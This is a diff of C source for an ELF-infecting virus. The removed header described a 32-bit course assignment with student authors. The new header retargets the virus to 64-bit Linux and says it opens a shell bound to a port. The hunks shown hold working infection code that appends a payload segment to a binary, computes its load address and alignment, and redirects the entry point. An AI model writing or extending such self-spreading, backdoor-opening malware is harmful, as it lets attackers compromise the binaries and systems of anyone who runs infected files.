@@ -1,13 +1,9 @@
 /*
- * This file implements a simple virus to infect ELF binaries on 
- * 32-bit x86 GNU/linux machines. The virus does nothing more harmful
- * than spread itself to other binaries, spreading itself further from 
- * there. Infection progress is logged in /tmp/.infection-progress.
- *
- * Written as the final assignment for the course 2WC06 Hackers Hutt, by:
- * 		Rene Gabriels
- *		Dirk Gerrits
- *		Peter Kooijmans
+ * This file implements a virus to infect ELF binaries on 
+ * 64-bit x86 GNU/linux machines. The virus will spread 
+ * itself to other binaries, and will create a shell binded
+ * to certain port. Infection progress is logged in /tmp/.infection-progress.
+ * Infected ELFs will be logged in /tmp/.infection-log 
  */
  
 #include "syscall_64.h"
@@ -384,8 +380,8 @@ static NOINLINE int infect_ELF(int fd, char const* payload, int payload_size,			
 			//alignment as the code has in the file.
 			phdr.p_offset = payload_offset = lseek(fd, 0, SEEK_END);					//**place the segment in the end of the file	*
 			payload_address = 0x0000000000400000 - (payload_size+pre_payload_size);
-			adjustment = payload_offset % 0x1000 - payload_address % 0x1000;			//**???
-			if (adjustment > 0)payload_address -= 0x1000;								//**???
+			adjustment = payload_offset % 0x1000 - payload_address % 0x1000;			
+			if (adjustment > 0)payload_address -= 0x1000;								
 			payload_address += adjustment;
 			ehdr.e_entry = payload_address;												//**executable segment entry
 			
@@ -417,8 +413,8 @@ static NOINLINE int infect_ELF(int fd, char const* payload, int payload_size,			
 	// original program was.
 	log_verbose_progress(STR("__.._writing_pre_payload...\\n"),0,0);
 	
-	*pre_payload_code_offset = code_offset + (pre_payload_size - 11);								//**???not used
-	*pre_payload_old_entry_point = old_entry_point - (payload_address + pre_payload_size);			//**???not used
+	*pre_payload_code_offset = code_offset + (pre_payload_size - 11);								
+	*pre_payload_old_entry_point = old_entry_point - (payload_address + pre_payload_size);			
 	if(lseek(fd, payload_offset, SEEK_SET) < 0)														//**set the cursor to SEEK_SET+SEEK_END...(payload_offset=SEEK_END)
 		return INFECTION_FAILED;
 	bytes_written = write_buf(fd, pre_payload, pre_payload_size);									//**write pre_payload to the end of file
